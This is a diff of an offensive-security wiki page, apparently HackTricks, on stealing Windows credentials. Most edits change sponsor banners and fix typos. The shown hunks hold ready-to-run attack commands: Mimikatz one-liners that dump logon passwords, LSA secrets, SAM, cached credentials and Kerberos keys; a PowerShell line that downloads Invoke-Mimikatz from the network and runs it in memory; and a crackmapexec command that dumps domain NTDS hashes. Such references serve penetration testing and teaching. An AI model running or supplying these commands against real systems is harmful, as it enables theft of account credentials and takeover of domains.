@@ -1,27 +1,31 @@
-# Stealing Credentials
+# Stealing Windows Credentials
 
 <details>
 
-<summary><strong>Support HackTricks and get benefits!</strong></summary>
+<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-{% hint style="danger" %}
-<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
-_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
+​
 
-{% embed url="https://securityboat.in/contact-us" %}
-{% endhint %}
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+**[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
+
+🐞 Read web3 bug tutorials
+
+🔔 Get notified about new bug bounties
+
+💬 Participate in community discussions
+
+
+
 
 ## Credentials Mimikatz
 
@@ -36,7 +40,7 @@ lsadump::lsa /inject
 #Extract from SAM
 lsadump::sam
 #One liner
-mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"
+mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
 
 **Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
@@ -46,7 +50,7 @@ mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
 
 [**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
@@ -166,12 +170,18 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 
-{% hint style="danger" %}
-<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
-_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://securityboat.in/contact-us" %}
-{% endhint %}
+**[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
+
+🐞 Read web3 bug tutorials
+
+🔔 Get notified about new bug bounties
+
+💬 Participate in community discussions
+
+
+
 
 ## Stealing SAM & SYSTEM
 
@@ -241,7 +251,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 **The Ntds.dit file is a database that stores Active Directory data**, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
 
 The important NTDS.dit file will be **located in**: _%SystemRoom%/NTDS/ntds.dit_\
-\_\_This file is a database _Extensible Storage Engine_ (ESE) and is "officially" composed by 3 tables:
+This file is a database _Extensible Storage Engine_ (ESE) and is "officially" composed by 3 tables:
 
 * **Data Table**: Contains the information about the objects (users, groups...)
 * **Link Table**: Information about the relations (member of...)
@@ -249,7 +259,7 @@ The important NTDS.dit file will be **located in**: _%SystemRoom%/NTDS/ntds.dit_
 
 More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the \_lsass**\_\*\* memory\*\* (you can find the lastet accessed data probably because of the performance impruve by using a **cache**).
+Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
 
 #### Decrypting the hashes inside NTDS.dit
 
@@ -330,25 +340,29 @@ Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco
 
 [**Learn about some credentials protections here.**](credentials-protections.md)
 
-{% hint style="danger" %}
-<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
-_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
+​
 
-{% embed url="https://securityboat.in/contact-us" %}
-{% endhint %}
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+**[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
+
+🐞 Read web3 bug tutorials
+
+🔔 Get notified about new bug bounties
+
+💬 Participate in community discussions
+
+
+
 
 <details>
 
-<summary><strong>Support HackTricks and get benefits!</strong></summary>
+<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
